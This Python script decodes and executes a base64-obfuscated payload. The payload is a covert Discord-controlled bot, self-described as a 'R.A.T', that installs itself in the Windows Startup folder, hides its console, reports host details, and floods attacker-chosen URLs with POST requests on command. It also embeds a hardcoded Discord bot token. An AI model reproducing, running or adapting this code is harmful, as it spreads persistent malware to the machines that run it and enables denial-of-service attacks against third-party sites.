import base64

b64_code = """
aW1wb3J0IGxvZ2dpbmcKaW1wb3J0IHN5cwppbXBvcnQgaW8KCm9sZF9zdGRvdXQgPSBzeXMuc3Rkb3V0Cm9sZF9zdGRlcnIgPSBzeXMuc3RkZXJyCnN5cy5zdGRvdXQgPSBpby5TdHJpbmdJTygpCnN5cy5zdGRlcnIgPSBpby5TdHJpbmdJTygpCgoKaW1wb3J0IGRpc2NvcmQKaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGFzeW5jaW8KaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCBqc29uCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc29ja2V0CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzaHV0aWwKaW1wb3J0IG9zCmltcG9ydCBjdHlwZXMKCnN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmdldGVudignQVBQREFUQScpLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcidNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAnKQoKc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmFyZ3ZbMF0pCnNob3J0Y3V0X3BhdGggPSBvcy5wYXRoLmpvaW4oc3RhcnR1cF9mb2xkZXIsICJ2Y3J1bnRpbWV4ODYuYmF0IikKCndpdGggb3BlbihzaG9ydGN1dF9wYXRoLCAidyIpIGFzIGY6CiAgICBmLndyaXRlKGYnQGVjaG8gb2ZmXG4ie3N5cy5leGVjdXRhYmxlLnJlcGxhY2UoInB5dGhvbi5leGUiLCJweXRob253LmV4ZSIpfSIgIntzY3JpcHRfcGF0aH0iXG5leGl0JykKCgoKCnJlcXVpcmVtZW50cyA9IFsKICAgICJkaXNjb3JkLnB5Pj0yLjYuMCIsCiAgICAiYWlvaHR0cD49My44LjUiCl0KCmRlZiBpbnN0YWxsKHBhY2thZ2UpOgogICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKFtzeXMuZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgcGFja2FnZV0pCgoKZm9yIHBhY2thZ2UgaW4gcmVxdWlyZW1lbnRzOgogICAgdHJ5OgogICAgICAgIF9faW1wb3J0X18ocGFja2FnZS5zcGxpdCgiPT0iKVswXS5zcGxpdCgiPj0iKVswXSkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBwcmludChmIkluc3RhbGxpbmcge3BhY2thZ2V9Li4uIikKICAgICAgICBpbnN0YWxsKHBhY2thZ2UpCgpwcmludCgi4pyFIEFsbCBkZXBlbmRlbmNpZXMgYXJlIGluc3RhbGxlZCEiKQoKZm9yIHBhY2thZ2UgaW4gcmVxdWlyZW1lbnRzOgogICAgdHJ5OgogICAgICAgIF9faW1wb3J0X18ocGFja2FnZSkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAiLW0iLCAicGlwIiwgImluc3RhbGwiLCBwYWNrYWdlXSkKCmN0eXBlcy53aW5kbGwudXNlcjMyLlNob3dXaW5kb3coY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5HZXRDb25zb2xlV2luZG93KCksIDApCgoKQk9UX1RPS0VOID0gIk1UUXdOVEV5TlRRME5qSXhNRFk0TWprME1BLkdiU045QS5zc3FOWklpZWpiWVpnRFlJb2dwRUp1YlU1WlZNR2hlcHZjNjhsRSIKQ0hBTk5FTF9JRCA9IDE0MDU2MDc1NTAwODY1NDk1NjUKCmludGVudHMgPSBkaXNjb3JkLkludGVudHMuZGVmYXVsdCgpCmludGVudHMubWVzc2FnZV9jb250ZW50ID0gVHJ1ZQpjbGllbnQgPSBkaXNjb3JkLkNsaWVudChpbnRlbnRzPWludGVudHMpCgoKCnN0cmVzc19ydW5uaW5nID0gRmFsc2UKY3VycmVudF90YXNrID0gTm9uZQoKYXN5bmMgZGVmIHdvcmtlcihzZXNzaW9uLCB1cmwsIGR1cmF0aW9uLCBwYXlsb2FkLCBzdGF0cyk6CiAgICBlbmRfdGltZSA9IHRpbWUudGltZSgpICsgZHVyYXRpb24KICAgIHdoaWxlIHRpbWUudGltZSgpIDwgZW5kX3RpbWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkgYXMgcmVzcDoKICAgICAgICAgICAgICAgIHN0YXRzWyJzZW50Il0gKz0gMSAgCiAgICAgICAgICAgICAgICBhd2FpdCByZXNwLnRleHQoKSAgIAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHN0YXRzWyJlcnJvcnMiXSArPSAxCgoKYXN5bmMgZGVmIHJ1bl9zdHJlc3NfdGVzdCh1cmwsIHdvcmtlcnMsIGR1cmF0aW9uLCBwYXlsb2FkX3NpemUsIGNoYW5uZWwpOgogICAgZ2xvYmFsIHN0cmVzc19ydW5uaW5nCiAgICBzdHJlc3NfcnVubmluZyA9IFRydWUKCiAgICBwYXlsb2FkID0gJycuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfbGV0dGVycywgaz1wYXlsb2FkX3NpemUgKiAxMDI0KSkuZW5jb2RlKCkKICAgIHN0YXRzID0geyJzZW50IjogMCwgImVycm9ycyI6IDB9CgogICAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzZXNzaW9uOgogICAgICAgIHRhc2tzID0gW3dvcmtlcihzZXNzaW9uLCB1cmwsIGR1cmF0aW9uLCBwYXlsb2FkLCBzdGF0cykgZm9yIF8gaW4gcmFuZ2Uod29ya2VycyldCgogICAgICAgIAogICAgICAgIHByb2dyZXNzX21zZyA9IGF3YWl0IGNoYW5uZWwuc2VuZChmIvCfmoAgU3RhcnRpbmcgdGVzdCBvbiBge3VybH1gLi4uIikKCiAgICAgICAgc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICAgICAgdG90YWxfYmxvY2tzID0gMjAgIAoKICAgICAgICB3aGlsZSB0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUgPCBkdXJhdGlvbjoKICAgICAgICAgICAgZWxhcHNlZCA9IGludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpCiAgICAgICAgICAgIHByb2dyZXNzID0gZWxhcHNlZCAvIGR1cmF0aW9uCiAgICAgICAgICAgIGZpbGxlZCA9IGludChwcm9ncmVzcyAqIHRvdGFsX2Jsb2NrcykKICAgICAgICAgICAgYmFyID0gIuKWiCIgKiBmaWxsZWQgKyAi4paRIiAqICh0b3RhbF9ibG9ja3MgLSBmaWxsZWQpCiAgICAgICAgICAgIGV0YSA9IGR1cmF0aW9uIC0gZWxhcHNlZAoKICAgICAgICAgICAgYXdhaXQgcHJvZ3Jlc3NfbXNnLmVkaXQoY29udGVudD0oCiAgICAgICAgICAgICAgICBmIlJQQ1NlbnQ6IHtzdGF0c1snc2VudCddfSB8IEVycm9yczoge3N0YXRzWydlcnJvcnMnXX0gfCBFVEE6IHtldGF9c1xuIgogICAgICAgICAgICAgICAgZiLwn5OKIHtlbGFwc2VkfS97ZHVyYXRpb259cyBbe2Jhcn1dIHtpbnQocHJvZ3Jlc3MqMTAwKX0lIHwgIgogICAgICAgICAgICAgICAgZiJTZW50OiB7c3RhdHNbJ3NlbnQnXX0gfCBFcnJvcnM6IHtzdGF0c1snZXJyb3JzJ119IgogICAgICAgICAgICApKQoKICAgICAgICAgICAgYXdhaXQgYXN5bmNpby5zbGVlcCgxKSAgCgogICAgICAgCiAgICAgICAgYXdhaXQgYXN5bmNpby5nYXRoZXIoKnRhc2tzKQogICAgICAgIHN0cmVzc19ydW5uaW5nID0gRmFsc2UKCiAgICAgICAgCiAgICAgICAgYXdhaXQgcHJvZ3Jlc3NfbXNnLmVkaXQoY29udGVudD0oCiAgICAgICAgICAgIGYi4pyFIEZpbmlzaGVkIHRlc3Qgb24gYHt1cmx9YCFcbiIKICAgICAgICAgICAgZiJUb3RhbCBSUENTZW50OiB7c3RhdHNbJ3NlbnQnXX0gfCBFcnJvcnM6IHtzdGF0c1snZXJyb3JzJ119IgogICAgICAgICkpCgoKCkBjbGllbnQuZXZlbnQKYXN5bmMgZGVmIG9uX3JlYWR5KCk6CiAgICBwcmludChmIkxPQURJTkcgUi5BLlQgQlVJTERFUiIpCgpAY2xpZW50LmV2ZW50CmFzeW5jIGRlZiBvbl9tZXNzYWdlKG1lc3NhZ2UpOgogICAgZ2xvYmFsIHN0cmVzc19ydW5uaW5nLCBjdXJyZW50X3Rhc2sKCiAgICBpZiBtZXNzYWdlLmF1dGhvciA9PSBjbGllbnQudXNlcjoKICAgICAgICByZXR1cm4KCiAgIAogICAgaWYgbWVzc2FnZS5jaGFubmVsLmlkID09IENIQU5ORUxfSUQgYW5kIG1lc3NhZ2UuY29udGVudC5zdGFydHN3aXRoKCJ7Iik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjb25maWcgPSBqc29uLmxvYWRzKG1lc3NhZ2UuY29udGVudCkKICAgICAgICAgICAgdXJsID0gY29uZmlnLmdldCgidXJsIikKICAgICAgICAgICAgd29ya2VycyA9IGludChjb25maWcuZ2V0KCJ3b3JrZXJzIiwgNTApKQogICAgICAgICAgICBkdXJhdGlvbiA9IGludChjb25maWcuZ2V0KCJkdXJhdGlvbiIsIDEwKSkKICAgICAgICAgICAgcGF5bG9hZF9zaXplID0gaW50KGNvbmZpZy5nZXQoInBheWxvYWRfa2IiLCAxKSkKCiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKAogICAgICAgICAgICAgICAgZiLwn5qAIFF1ZXVlZCB0ZXN0IG9uIGB7dXJsfWAgd2l0aCB7d29ya2Vyc30gd29ya2VycyBmb3Ige2R1cmF0aW9ufXMsIHBheWxvYWQge3BheWxvYWRfc2l6ZX1LQiIKICAgICAgICAgICAgKQoKICAgICAgICAgICAgY3VycmVudF90YXNrID0gYXN5bmNpby5jcmVhdGVfdGFzaygKICAgICAgICAgICAgICAgIHJ1bl9zdHJlc3NfdGVzdCh1cmwsIHdvcmtlcnMsIGR1cmF0aW9uLCBwYXlsb2FkX3NpemUsIG1lc3NhZ2UuY2hhbm5lbCkKICAgICAgICAgICAgKQoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKGYi4pqg77iPIEVycm9yOiB7ZX0iKQoKICAgCiAgICBlbGlmIG1lc3NhZ2UuY29udGVudC5sb3dlcigpIGluICgiL2JvdHMiLCAiIWJvdHMiKToKICAgICAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAgICAgICAgb3NfbmFtZSA9IHBsYXRmb3JtLnN5c3RlbSgpCiAgICAgICAgcHl0aG9uX3ZlciA9IHBsYXRmb3JtLnB5dGhvbl92ZXJzaW9uKCkKICAgICAgICBzdGF0dXMgPSAiUnVubmluZyBzdHJlc3MgdGVzdCIgaWYgc3RyZXNzX3J1bm5pbmcgZWxzZSAiSWRsZSIKCiAgICAgICAgaW5mb19tc2cgPSAoCiAgICAgICAgICAgIGYi8J+Wpe+4jyBIb3N0bmFtZToge2hvc3RuYW1lfVxuIgogICAgICAgICAgICBmIvCfkrsgT1M6IHtvc19uYW1lfVxuIgogICAgICAgICAgICBmIvCfkI0gUHl0aG9uOiB7cHl0aG9uX3Zlcn1cbiIKICAgICAgICAgICAgZiLimqEgU3RhdHVzOiB7c3RhdHVzfSIKICAgICAgICApCiAgICAgICAgYXdhaXQgbWVzc2FnZS5jaGFubmVsLnNlbmQoaW5mb19tc2cpCgoKCmNsaWVudC5ydW4oQk9UX1RPS0VOKQo=
"""


b64_clean = "".join(b64_code.split())

try:
    
    decoded_bytes = base64.b64decode(b64_clean)
    
   
    decoded_code = decoded_bytes.decode('utf-8')

    
    exec(decoded_code)
except Exception as e:
    print(f"Failed to decode or execute Base64 code: {e}")
